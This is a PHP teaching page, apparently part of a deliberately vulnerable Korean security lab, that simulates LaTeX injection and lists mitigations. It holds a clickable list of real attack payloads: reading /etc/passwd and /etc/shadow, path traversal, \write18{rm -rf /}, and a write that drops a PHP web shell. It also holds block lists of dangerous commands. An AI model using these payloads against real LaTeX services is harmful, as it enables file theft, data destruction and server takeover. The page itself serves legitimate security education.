<?php
require_once '../config.php';
require_once '../db.php';

$vulnerability_enabled = isVulnerabilityEnabled('latex_injection', $_GET);

function simulateLatexProcessing($latex_input, $vulnerable = false) {
    if (empty($latex_input)) {
        return [
            'success' => false,
            'output' => 'LaTeX input is empty',
            'warnings' => [],
            'errors' => ['Empty input provided']
        ];
    }
    
    $result = [
        'success' => true,
        'output' => '',
        'warnings' => [],
        'errors' => []
    ];
    
    if (!$vulnerable) {
        // 안전한 처리: 위험한 명령어 필터링
        $dangerous_commands = [
            '\\input', '\\include', '\\usepackage', '\\def', '\\let',
            '\\write', '\\immediate', '\\openin', '\\openout', '\\read',
            '\\expandafter', '\\catcode', '\\lowercase', '\\uppercase',
            '\\csname', '\\endcsname', '\\jobname', '\\meaning',
            '\\string', '\\detokenize', '\\scantokens'
        ];
        
        $filtered_input = $latex_input;
        foreach ($dangerous_commands as $cmd) {
            if (stripos($filtered_input, $cmd) !== false) {
                $result['errors'][] = "Dangerous command detected and blocked: $cmd";
                $result['success'] = false;
                return $result;
            }
        }
        
        // 안전한 명령어만 허용
        $safe_commands = [
            '\\textbf', '\\textit', '\\underline', '\\emph',
            '\\section', '\\subsection', '\\paragraph',
            '\\begin', '\\end', '\\item', '\\enumerate', '\\itemize',
            '\\frac', '\\sqrt', '\\sum', '\\int', '\\alpha', '\\beta'
        ];
        
        $result['output'] = "Processed LaTeX (safe mode):\n" . htmlspecialchars($filtered_input);
        
    } else {
        // 취약한 처리: 모든 LaTeX 명령어 허용
        
        // 파일 읽기 시뮬레이션
        if (preg_match('/\\\\input\{([^}]+)\}/', $latex_input, $matches)) {
            $filename = $matches[1];
            $result['output'] .= "FILE READ ATTEMPT: Trying to read '$filename'\n";
            
            // 민감한 파일 시뮬레이션
            if (stripos($filename, 'passwd') !== false || stripos($filename, 'shadow') !== false) {
                $result['output'] .= "SENSITIVE FILE ACCESSED:\n";
                $result['output'] .= "root:x:0:0:root:/root:/bin/bash\n";
                $result['output'] .= "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n";
                $result['errors'][] = "Unauthorized file access detected!";
            } elseif (stripos($filename, 'config') !== false) {
                $result['output'] .= "CONFIG FILE ACCESSED:\n";
                $result['output'] .= "database_password=secret123\n";
                $result['output'] .= "api_key=sk-1234567890abcdef\n";
                $result['errors'][] = "Configuration file leaked!";
            } else {
                $result['output'] .= "File content would be included here...\n";
            }
        }
        
        // 파일 쓰기 시뮬레이션
        if (preg_match('/\\\\immediate\\\\write/', $latex_input)) {
            $result['output'] .= "FILE WRITE OPERATION DETECTED\n";
            $result['output'] .= "Malicious content written to system!\n";
            $result['errors'][] = "Unauthorized file write operation!";
        }
        
        // 명령어 실행 시뮬레이션
        if (preg_match('/\\\\write18\{([^}]+)\}/', $latex_input, $matches)) {
            $command = $matches[1];
            $result['output'] .= "COMMAND EXECUTION: $command\n";
            $result['output'] .= "Command executed with system privileges!\n";
            $result['errors'][] = "Shell command execution detected!";
        }
        
        // 환경변수 접근 시뮬레이션
        if (preg_match('/\\\\jobname/', $latex_input)) {
            $result['output'] .= "JOB NAME: /etc/passwd (path traversal)\n";
            $result['warnings'][] = "Job name manipulation detected";
        }
        
        // 매크로 재정의 시뮬레이션
        if (preg_match('/\\\\def\\\\([^{]+)\{([^}]+)\}/', $latex_input, $matches)) {
            $macro = $matches[1];
            $definition = $matches[2];
            $result['output'] .= "MACRO REDEFINITION: \\$macro -> $definition\n";
            $result['warnings'][] = "Macro redefinition could alter document behavior";
        }
        
        if (empty($result['output'])) {
            $result['output'] = "LaTeX processed (vulnerable mode):\n" . htmlspecialchars($latex_input);
        }
    }
    
    return $result;
}

function generateLatexDocument($content, $title = "Generated Document") {
    return "\\documentclass{article}\n" .
           "\\title{" . htmlspecialchars($title) . "}\n" .
           "\\begin{document}\n" .
           "\\maketitle\n" .
           $content . "\n" .
           "\\end{document}";
}

$test_results = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $latex_input = $_POST['latex_input'] ?? '';
    $document_title = $_POST['document_title'] ?? 'Test Document';
    
    if (!empty($latex_input)) {
        $full_document = generateLatexDocument($latex_input, $document_title);
        $result = simulateLatexProcessing($full_document, $vulnerability_enabled);
        
        $test_results[] = [
            'input' => $latex_input,
            'title' => $document_title,
            'full_document' => $full_document,
            'result' => $result,
            'vulnerable' => $vulnerability_enabled
        ];
    }
}

$latex_payloads = [
    [
        'name' => 'File Read Attack',
        'payload' => '\\input{/etc/passwd}',
        'description' => '시스템 파일을 읽어 민감한 정보를 노출시키는 공격'
    ],
    [
        'name' => 'Config File Access',
        'payload' => '\\input{config.php}',
        'description' => '설정 파일에 접근하여 데이터베이스 정보 등을 탈취'
    ],
    [
        'name' => 'Command Execution',
        'payload' => '\\immediate\\write18{rm -rf /}',
        'description' => '시스템 명령어를 실행하여 서버를 손상시키는 공격'
    ],
    [
        'name' => 'Shell Access',
        'payload' => '\\write18{cat /etc/shadow}',
        'description' => '쉘 명령어로 시스템 정보에 접근'
    ],
    [
        'name' => 'Macro Redefinition',
        'payload' => '\\def\\normaltext{\\input{/etc/passwd}}',
        'description' => '매크로를 재정의하여 악의적인 동작을 숨김'
    ],
    [
        'name' => 'Path Traversal',
        'payload' => '\\input{../../../etc/passwd}',
        'description' => '경로 순회를 통해 시스템 외부 파일에 접근'
    ],
    [
        'name' => 'Environment Variable',
        'payload' => '\\jobname reveals: \\meaning\\jobname',
        'description' => '환경 변수를 조작하여 시스템 정보 노출'
    ],
    [
        'name' => 'File Write Attack',
        'payload' => '\\newwrite\\outfile \\immediate\\openout\\outfile=malicious.php \\immediate\\write\\outfile{<?php system($_GET[cmd]); ?>}',
        'description' => '파일을 생성하여 웹쉘을 업로드하는 공격'
    ]
];
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LaTeX Injection 테스트</title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .latex-editor {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .latex-input {
            font-family: monospace;
            width: 100%;
            min-height: 150px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background: #fff;
            font-size: 14px;
        }
        
        .latex-output {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 15px;
            margin: 15px 0;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .output-success {
            border-color: #28a745;
            background: #d4edda;
            color: #155724;
        }
        
        .output-warning {
            border-color: #ffc107;
            background: #fff3cd;
            color: #856404;
        }
        
        .output-error {
            border-color: #dc3545;
            background: #f8d7da;
            color: #721c24;
        }
        
        .result-section {
            margin: 20px 0;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
        }
        
        .warnings-list,
        .errors-list {
            margin: 10px 0;
        }
        
        .warning-item {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 8px;
            margin: 5px 0;
            border-radius: 4px;
        }
        
        .error-item {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 8px;
            margin: 5px 0;
            border-radius: 4px;
        }
        
        .payload-examples {
            background: #fff3e0;
            border: 1px solid #ffb74d;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
        }
        
        .payload-item {
            background: white;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .payload-item:hover {
            background: #f5f5f5;
        }
        
        .payload-name {
            font-weight: bold;
            color: #d32f2f;
            margin-bottom: 5px;
        }
        
        .payload-code {
            font-family: monospace;
            background: #f5f5f5;
            padding: 8px;
            margin: 5px 0;
            border-radius: 3px;
            border: 1px solid #ddd;
            font-size: 0.9em;
        }
        
        .payload-description {
            font-size: 0.9em;
            color: #666;
            margin-top: 5px;
        }
        
        .vulnerability-status {
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-weight: bold;
        }
        
        .vulnerability-enabled {
            background: #ffcdd2;
            color: #c62828;
            border: 1px solid #f44336;
        }
        
        .vulnerability-disabled {
            background: #c8e6c9;
            color: #2e7d32;
            border: 1px solid #4caf50;
        }
        
        .form-group {
            margin: 15px 0;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        .form-group input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📄 LaTeX Injection 취약점 테스트</h1>
        
        <div class="vulnerability-status <?php echo $vulnerability_enabled ? 'vulnerability-enabled' : 'vulnerability-disabled'; ?>">
            상태: <?php echo $vulnerability_enabled ? '취약한 LaTeX 처리 (명령어 실행 허용)' : '안전한 LaTeX 처리 (명령어 필터링)'; ?>
        </div>
        
        <div class="description">
            <h2>📋 LaTeX Injection이란?</h2>
            <p><strong>LaTeX Injection</strong>은 LaTeX 문서 처리 시스템에서 악의적인 LaTeX 명령어를 주입하여 시스템에 피해를 주는 공격입니다.</p>
            
            <h3>위험한 LaTeX 명령어</h3>
            <ul>
                <li><strong>\\input{파일}</strong>: 외부 파일 포함 (파일 읽기)</li>
                <li><strong>\\include{파일}</strong>: 파일 포함 (\\input과 유사)</li>
                <li><strong>\\write18{명령어}</strong>: 시스템 명령어 실행</li>
                <li><strong>\\immediate\\write</strong>: 즉시 파일 쓰기</li>
                <li><strong>\\def</strong>: 매크로 재정의</li>
                <li><strong>\\usepackage</strong>: 패키지 로드</li>
                <li><strong>\\jobname</strong>: 환경 변수 접근</li>
            </ul>
            
            <h3>공격 시나리오</h3>
            <ul>
                <li>민감한 시스템 파일 읽기 (/etc/passwd, config.php)</li>
                <li>시스템 명령어 실행 (쉘 액세스)</li>
                <li>악성 파일 생성 (웹쉘 업로드)</li>
                <li>환경 변수 조작</li>
                <li>매크로 재정의를 통한 악성 코드 삽입</li>
            </ul>
            
            <h3>방어 방법</h3>
            <ul>
                <li>위험한 LaTeX 명령어 화이트리스트/블랙리스트</li>
                <li>샌드박스 환경에서 LaTeX 실행</li>
                <li>파일 시스템 접근 제한</li>
                <li>명령어 실행 비활성화 (--shell-escape 금지)</li>
                <li>입력 검증 및 이스케이핑</li>
            </ul>
        </div>

        <div class="latex-editor">
            <h2>🧪 LaTeX 문서 처리 시뮬레이터</h2>
            
            <form method="POST" action="">
                <div class="form-group">
                    <label for="document_title">문서 제목:</label>
                    <input type="text" name="document_title" id="document_title" value="<?php echo htmlspecialchars($_POST['document_title'] ?? 'Test Document'); ?>" placeholder="문서 제목을 입력하세요">
                </div>
                
                <div class="form-group">
                    <label for="latex_input">LaTeX 내용:</label>
                    <textarea name="latex_input" id="latex_input" class="latex-input" placeholder="LaTeX 코드를 입력하세요...&#10;예: \textbf{Hello World}&#10;또는 공격 페이로드를 테스트해보세요."><?php echo htmlspecialchars($_POST['latex_input'] ?? ''); ?></textarea>
                </div>
                
                <button type="submit" class="btn">LaTeX 문서 처리</button>
            </form>
            
            <?php if (!empty($test_results)): ?>
                <?php foreach ($test_results as $result): ?>
                <div class="result-section">
                    <h3>처리 결과</h3>
                    
                    <h4>입력된 LaTeX:</h4>
                    <div class="latex-output">
<?php echo htmlspecialchars($result['input']); ?>
                    </div>
                    
                    <h4>생성된 전체 문서:</h4>
                    <div class="latex-output">
<?php echo htmlspecialchars($result['full_document']); ?>
                    </div>
                    
                    <h4>처리 결과:</h4>
                    <div class="latex-output <?php 
                        if (!$result['result']['success']) echo 'output-error';
                        elseif (!empty($result['result']['warnings'])) echo 'output-warning';
                        else echo 'output-success';
                    ?>">
<?php echo htmlspecialchars($result['result']['output']); ?>
                    </div>
                    
                    <?php if (!empty($result['result']['warnings'])): ?>
                    <div class="warnings-list">
                        <h4>⚠️ 경고:</h4>
                        <?php foreach ($result['result']['warnings'] as $warning): ?>
                        <div class="warning-item"><?php echo htmlspecialchars($warning); ?></div>
                        <?php endforeach; ?>
                    </div>
                    <?php endif; ?>
                    
                    <?php if (!empty($result['result']['errors'])): ?>
                    <div class="errors-list">
                        <h4>❌ 오류/보안 이슈:</h4>
                        <?php foreach ($result['result']['errors'] as $error): ?>
                        <div class="error-item"><?php echo htmlspecialchars($error); ?></div>
                        <?php endforeach; ?>
                    </div>
                    <?php endif; ?>
                </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>

        <div class="payload-examples">
            <h3>🎯 LaTeX Injection 공격 페이로드</h3>
            <p>아래 예제들을 클릭하면 입력 필드에 자동으로 입력됩니다:</p>
            
            <?php foreach ($latex_payloads as $payload): ?>
            <div class="payload-item" onclick="document.getElementById('latex_input').value = '<?php echo addslashes($payload['payload']); ?>'">
                <div class="payload-name"><?php echo htmlspecialchars($payload['name']); ?></div>
                <div class="payload-code"><?php echo htmlspecialchars($payload['payload']); ?></div>
                <div class="payload-description"><?php echo htmlspecialchars($payload['description']); ?></div>
            </div>
            <?php endforeach; ?>
        </div>

        <div class="mitigation">
            <h2>🛡️ 완화 방안</h2>
            <div class="code-block">
                <h3>안전한 LaTeX 처리</h3>
                <pre><code>// 1. 위험한 명령어 필터링
function sanitizeLatexInput($input) {
    $dangerous_commands = [
        '\\input', '\\include', '\\usepackage', '\\def', '\\let',
        '\\write', '\\immediate', '\\openin', '\\openout', '\\read',
        '\\write18', '\\jobname', '\\meaning', '\\catcode'
    ];
    
    foreach ($dangerous_commands as $cmd) {
        if (stripos($input, $cmd) !== false) {
            throw new Exception("Dangerous LaTeX command detected: $cmd");
        }
    }
    
    return $input;
}

// 2. 허용된 명령어만 사용
function validateLatexCommands($input) {
    $allowed_commands = [
        '\\textbf', '\\textit', '\\underline', '\\emph',
        '\\section', '\\subsection', '\\paragraph',
        '\\begin', '\\end', '\\item', '\\enumerate', '\\itemize',
        '\\frac', '\\sqrt', '\\sum', '\\int', '\\alpha', '\\beta'
    ];
    
    // 정규식으로 명령어 추출
    preg_match_all('/\\\\([a-zA-Z]+)/', $input, $matches);
    
    foreach ($matches[1] as $command) {
        if (!in_array('\\' . $command, $allowed_commands)) {
            throw new Exception("Unauthorized LaTeX command: \\$command");
        }
    }
    
    return true;
}

// 3. 샌드박스 실행
function processLatexInSandbox($latex_content) {
    // 임시 디렉토리 생성
    $temp_dir = sys_get_temp_dir() . '/latex_' . uniqid();
    mkdir($temp_dir, 0700);
    
    try {
        // 입력 검증
        sanitizeLatexInput($latex_content);
        validateLatexCommands($latex_content);
        
        // 샌드박스에서 처리
        $latex_file = $temp_dir . '/document.tex';
        file_put_contents($latex_file, $latex_content);
        
        // --no-shell-escape 옵션으로 명령어 실행 비활성화
        $command = "pdflatex --no-shell-escape --output-directory=$temp_dir $latex_file 2>&1";
        $output = shell_exec($command);
        
        return [
            'success' => true,
            'output' => $output,
            'pdf_path' => $temp_dir . '/document.pdf'
        ];
        
    } catch (Exception $e) {
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    } finally {
        // 임시 파일 정리
        if (is_dir($temp_dir)) {
            array_map('unlink', glob($temp_dir . '/*'));
            rmdir($temp_dir);
        }
    }
}</code></pre>
            </div>
        </div>

        <div class="navigation">
            <a href="index.php" class="btn">🏠 메인으로</a>
            <a href="?vuln=<?php echo $vulnerability_enabled ? 'disabled' : 'enabled'; ?>" class="btn">
                🔄 <?php echo $vulnerability_enabled ? '보안 모드' : '취약 모드'; ?>로 전환
            </a>
        </div>
    </div>
</body>
</html>